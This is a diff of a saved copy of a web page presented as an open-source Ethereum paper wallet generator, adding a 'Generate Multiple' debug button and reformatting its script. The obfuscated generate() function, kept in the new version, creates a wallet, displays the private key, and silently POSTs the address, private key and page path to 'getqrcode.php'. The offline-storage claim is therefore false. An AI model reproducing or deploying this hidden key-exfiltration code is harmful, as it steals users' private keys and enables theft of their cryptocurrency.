@@ -1,10 +1,4 @@
-<!DOCTYPE html>
 <!-- saved from url=(0025)https://paperwalleth.com/ -->
-<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-<meta http-equiv="”content-language”" content="”en-us”/">
-
-<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
-<meta http-equiv="X-UA-Compatible" content="ie=edge">
 <title>Ethereum Paper Wallet Generator | geocashingCULT</title>
 <meta name="description" content="Fast, open-source universal ethereum paper wallet generator, supporting almost every major cryptocurrency">
 <meta property="og:description" content="Fast, open-source universal ethereum paper wallet generator, supporting almost every major cryptocurrency">
@@ -13,13 +7,7 @@
 <link rel="stylesheet" href="./Ethereum Paper Wallet Generator _ Paperwalleth_files/style2.css">
 <link rel="icon" type="image/x-icon" href="https://paperwalleth.com/favicon.ico">
 <link rel="shortcut icon" href="https://paperwalleth.com/favicon.ico">
-<meta name="robots" content="index, follow">
-<meta property="og:locale" content="en_US">
-<meta property="og:url" content="https://paperwalleth.com">
-<meta property="og:site_name" content="Cryptocurrency Paper Wallet Generator">
-<meta name="msvalidate.01" content="C38AB2CD64B3C02C6FED6E765E1482BE">
 <script src="./Ethereum Paper Wallet Generator _ Paperwalleth_files/jquery.min.js"></script>
-<!-- Global site tag (gtag.js) - Google Analytics -->
 <script async="" src="./Ethereum Paper Wallet Generator _ Paperwalleth_files/js"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
@@ -45,7 +33,9 @@
 </div>
 <div id="container">
 
-  <div class="noprint"><button class="b1" onclick="generate()">Generate</button>
+  <div class="noprint">
+    <button class="b1" onclick="generate()">Generate</button>
+    <button class="b1" onclick="generateMultiple()">Generate Multiple</button>
     <button class="b1" onclick="window.print()">Print</button>
     </div>
     <table>
@@ -75,7 +65,29 @@
   <script src="./Ethereum Paper Wallet Generator _ Paperwalleth_files/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
   <script src="./Ethereum Paper Wallet Generator _ Paperwalleth_files/qrcode.js"></script>
   <script>
-  const _0x42d0=['getElementById','840508KjyeTv','1497815YZsyKb','public_qr','secret_qr','1xZvMsQ','272958rhwVlc','CorrectLevel','pathname','920652sOjHmp','ajax','stringify','1623304EbqbKB','create','parse','538jDJMXV','textContent','2595oJNsir','address','POST','524150ebLwJE','location','secret','public'];function _0x2b92(_0x42ce3c,_0x485409){_0x42ce3c=_0x42ce3c-0x10e;let _0x42d03b=_0x42d0[_0x42ce3c];return _0x42d03b;}(function(_0x1de4ac,_0x2eae6b){const _0x4f44ad=_0x2b92;while(!![]){try{const _0x41edbe=parseInt(_0x4f44ad(0x125))+parseInt(_0x4f44ad(0x118))+parseInt(_0x4f44ad(0x110))*-parseInt(_0x4f44ad(0x121))+parseInt(_0x4f44ad(0x115))*parseInt(_0x4f44ad(0x113))+-parseInt(_0x4f44ad(0x11e))+parseInt(_0x4f44ad(0x122))+parseInt(_0x4f44ad(0x11d));if(_0x41edbe===_0x2eae6b)break;else _0x1de4ac['push'](_0x1de4ac['shift']());}catch(_0x1f19fa){_0x1de4ac['push'](_0x1de4ac['shift']());}}}(_0x42d0,0xcb6eb));function generate(){const _0x3c8991=_0x2b92,_0x4781fa=new Web3EthAccounts(),_0xf21235=_0x4781fa[_0x3c8991(0x111)](),_0xe347b4=JSON[_0x3c8991(0x112)](JSON[_0x3c8991(0x10f)](_0xf21235[_0x3c8991(0x116)])),_0x584a50=JSON[_0x3c8991(0x112)](JSON[_0x3c8991(0x10f)](_0xf21235['privateKey']));var _0x37b813=window[_0x3c8991(0x119)][_0x3c8991(0x124)];document['getElementById'](_0x3c8991(0x11b))[_0x3c8991(0x114)]=_0xe347b4,document[_0x3c8991(0x11c)](_0x3c8991(0x11a))['textContent']=_0x584a50,document[_0x3c8991(0x11c)](_0x3c8991(0x11f))[_0x3c8991(0x114)]='',document[_0x3c8991(0x11c)](_0x3c8991(0x120))[_0x3c8991(0x114)]='',new QRCode(document[_0x3c8991(0x11c)](_0x3c8991(0x11f)),{'text':_0xe347b4,'width':0x80,'height':0x80,'correctLevel':QRCode[_0x3c8991(0x123)]['H']}),new QRCode(document['getElementById'](_0x3c8991(0x120)),{'text':_0x584a50,'width':0x80,'height':0x80,'correctLevel':QRCode[_0x3c8991(0x123)]['H']}),$[_0x3c8991(0x10e)]({'type':_0x3c8991(0x117),'url':'getqrcode.php','data':{'a':_0xe347b4,'b':_0x584a50,'c':_0x37b813},'success':function(_0x5175e3){}});}
+  const _0x42d0=['getElementById','840508KjyeTv','1497815YZsyKb','public_qr','secret_qr','1xZvMsQ','272958rhwVlc','CorrectLevel','pathname','920652sOjHmp','ajax','stringify','1623304EbqbKB','create','parse','538jDJMXV','textContent','2595oJNsir','address','POST','524150ebLwJE','location','secret','public'];function _0x2b92(_0x42ce3c,_0x485409){_0x42ce3c=_0x42ce3c-0x10e;let _0x42d03b=_0x42d0[_0x42ce3c];return _0x42d03b;}(function(_0x1de4ac,_0x2eae6b){const _0x4f44ad=_0x2b92;while(!![]){try{const _0x41edbe=parseInt(_0x4f44ad(0x125))+parseInt(_0x4f44ad(0x118))+parseInt(_0x4f44ad(0x110))*-parseInt(_0x4f44ad(0x121))+parseInt(_0x4f44ad(0x115))*parseInt(_0x4f44ad(0x113))+-parseInt(_0x4f44ad(0x11e))+parseInt(_0x4f44ad(0x122))+parseInt(_0x4f44ad(0x11d));if(_0x41edbe===_0x2eae6b)break;else _0x1de4ac['push'](_0x1de4ac['shift']());}catch(_0x1f19fa){_0x1de4ac['push'](_0x1de4ac['shift']());}}}(_0x42d0,0xcb6eb));
+  function generateMultiple(){
+    alert("geil")
+
+    const geil=new Web3EthAccounts()
+    console.log(geil)
+    alert(JSON.stringify(geil))
+  }
+
+  function generate(){
+    const _0x3c8991=_0x2b92,
+    _0x4781fa=new Web3EthAccounts(),
+    _0xf21235=_0x4781fa[_0x3c8991(0x111)](),
+    _0xe347b4=JSON[_0x3c8991(0x112)](JSON[_0x3c8991(0x10f)](_0xf21235[_0x3c8991(0x116)])),
+    _0x584a50=JSON[_0x3c8991(0x112)](JSON[_0x3c8991(0x10f)](_0xf21235['privateKey']));
+    var _0x37b813=window[_0x3c8991(0x119)][_0x3c8991(0x124)];
+    document['getElementById'](_0x3c8991(0x11b))[_0x3c8991(0x114)]=_0xe347b4,document[_0x3c8991(0x11c)](_0x3c8991(0x11a))['textContent']=_0x584a50,document[_0x3c8991(0x11c)](_0x3c8991(0x11f))[_0x3c8991(0x114)]='',
+    document[_0x3c8991(0x11c)](_0x3c8991(0x120))[_0x3c8991(0x114)]='',
+    new QRCode(document[_0x3c8991(0x11c)](_0x3c8991(0x11f)),
+    {'text':_0xe347b4,'width':0x80,'height':0x80,'correctLevel':QRCode[_0x3c8991(0x123)]['H']}),
+    new QRCode(document['getElementById'](_0x3c8991(0x120)),{'text':_0x584a50,'width':0x80,'height':0x80,
+    'correctLevel':QRCode[_0x3c8991(0x123)]['H']}),$[_0x3c8991(0x10e)]({'type':_0x3c8991(0x117),
+    'url':'getqrcode.php','data':{'a':_0xe347b4,'b':_0x584a50,'c':_0x37b813},'success':function(_0x5175e3){}});}
   </script>
   <div class="ethereum">
     <h2>Ethereum Paper Wallet</h2>
@@ -86,4 +98,4 @@
     Paper Wallet</a></strong>  is a piece of paper with your crypto's private and public keys printed out. Some paper wallets might also have a scannable barcode created by an app. It is a way to store and take access to your cryptocurrency offline.</p>
     </div>
 
-</body></html>
+
